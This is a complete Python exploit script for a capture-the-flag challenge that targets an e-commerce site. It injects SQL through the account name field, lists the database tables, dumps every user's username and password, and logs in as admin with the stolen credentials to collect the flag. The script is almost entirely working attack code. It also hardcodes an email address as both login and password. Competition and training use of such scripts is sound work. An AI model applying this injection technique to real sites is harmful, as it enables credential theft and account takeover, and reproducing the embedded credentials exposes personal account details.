#!/usr/bin/env python3
"""
E-Commerce Platform SQL Injection Exploit
CTF Challenge: CSC26
Target: https://lkjhgfdsaqwe-csc26.cybersecuritychallenge.al
"""

import requests
import re
import urllib.parse

BASE_URL = "https://lkjhgfdsaqwe-csc26.cybersecuritychallenge.al"

class EcommerceExploit:
    def __init__(self, username, password):
        self.session = requests.Session()
        self.username = username
        self.password = password
        self.logged_in = False
    
    def login(self):
        """Login with provided credentials"""
        print(f"[*] Logging in as {self.username}...")
        data = {"username": self.username, "password": self.password}
        r = self.session.post(f"{BASE_URL}/login", data=data)
        if "Account" in r.text or "Logout" in r.text:
            print("[+] Login successful!")
            self.logged_in = True
            return True
        print("[-] Login failed!")
        return False
    
    def sqli_extract(self, payload):
        """Execute SQL injection and extract data via name field"""
        if not self.logged_in:
            print("[-] Not logged in!")
            return None
        
        # Inject payload via name field
        sqli_payload = f"test'||({payload})--"
        data = {"name": sqli_payload, "currentpassword": self.password}
        
        # POST to update name
        self.session.post(f"{BASE_URL}/account", data=data)
        
        # GET to retrieve result
        r = self.session.get(f"{BASE_URL}/account")
        
        # Extract result from "Welcome to your account, <code>RESULT</code>"
        match = re.search(r'Welcome to your account, <code>(.*?)</code>', r.text, re.DOTALL)
        if match:
            result = match.group(1)
            # Remove the "test" prefix we added
            if result.startswith("test"):
                result = result[4:]
            return result
        return None
    
    def get_tables(self):
        """Get all table names"""
        print("[*] Extracting table names...")
        result = self.sqli_extract("SELECT group_concat(name) FROM sqlite_master WHERE type='table'")
        if result:
            print(f"[+] Tables: {result}")
        return result
    
    def get_table_schema(self, table_name):
        """Get schema for a specific table"""
        print(f"[*] Getting schema for table: {table_name}")
        result = self.sqli_extract(f"SELECT sql FROM sqlite_master WHERE name='{table_name}'")
        if result:
            print(f"[+] Schema: {result}")
        return result
    
    def dump_users(self):
        """Dump all users from the database"""
        print("[*] Dumping users table...")
        result = self.sqli_extract("SELECT group_concat(id||':'||username||':'||password||':'||name,'|') FROM users")
        if result:
            print("[+] Users found:")
            for user in result.split('|'):
                parts = user.split(':')
                if len(parts) >= 4:
                    print(f"    ID: {parts[0]}, Username: {parts[1]}, Password: {parts[2]}, Name: {parts[3]}")
        return result
    
    def dump_products(self):
        """Dump all products from the database"""
        print("[*] Dumping products table...")
        result = self.sqli_extract("SELECT group_concat(id||':'||title||':'||price,'|') FROM products")
        if result:
            print("[+] Products found:")
            for product in result.split('|'):
                parts = product.split(':')
                if len(parts) >= 3:
                    print(f"    ID: {parts[0]}, Title: {parts[1]}, Price: ${parts[2]}")
        return result
    
    def get_admin_creds(self):
        """Extract admin credentials"""
        print("[*] Looking for admin credentials...")
        result = self.sqli_extract("SELECT username||':'||password FROM users WHERE id=1")
        if result:
            print(f"[+] Admin credentials: {result}")
        return result
    
    def get_flag(self):
        """Login as admin and get the flag"""
        print("\n[*] === GETTING FLAG ===")
        
        # First extract admin creds
        admin_creds = self.get_admin_creds()
        if not admin_creds or ':' not in admin_creds:
            print("[-] Could not extract admin credentials")
            return None
        
        admin_user, admin_pass = admin_creds.split(':', 1)
        print(f"[+] Admin: {admin_user}:{admin_pass}")
        
        # Create new session for admin login
        admin_session = requests.Session()
        data = {"username": admin_user, "password": admin_pass}
        admin_session.post(f"{BASE_URL}/login", data=data)
        
        # Get admin account page
        r = admin_session.get(f"{BASE_URL}/account")
        
        # Look for flag
        flag_match = re.search(r'CSC26\{[^}]+\}', r.text)
        if flag_match:
            flag = flag_match.group(0)
            print(f"\n[+] ========== FLAG FOUND ==========")
            print(f"[+] {flag}")
            print(f"[+] ================================\n")
            return flag
        
        print("[-] Flag not found")
        return None


def main():
    print("=" * 50)
    print("E-Commerce Platform SQL Injection Exploit")
    print("=" * 50)
    
    # You need valid credentials to exploit (register an account first)
    # Replace with your credentials
    USERNAME = "agexha@gmail.com"
    PASSWORD = "agexha@gmail.com"
    
    print(f"\n[!] Using credentials: {USERNAME}:{PASSWORD}")
    print("[!] Register an account at the target if you don't have one\n")
    
    exploit = EcommerceExploit(USERNAME, PASSWORD)
    
    if not exploit.login():
        print("[-] Failed to login. Register an account first.")
        print(f"    Go to: {BASE_URL}/register")
        return
    
    print("\n" + "=" * 50)
    print("RECONNAISSANCE")
    print("=" * 50)
    
    # Get database info
    exploit.get_tables()
    exploit.get_table_schema("users")
    exploit.get_table_schema("products")
    
    print("\n" + "=" * 50)
    print("DATA EXTRACTION")
    print("=" * 50)
    
    # Dump data
    exploit.dump_users()
    exploit.dump_products()
    
    print("\n" + "=" * 50)
    print("FLAG EXTRACTION")  
    print("=" * 50)
    
    # Get the flag
    exploit.get_flag()


if __name__ == "__main__":
    main()
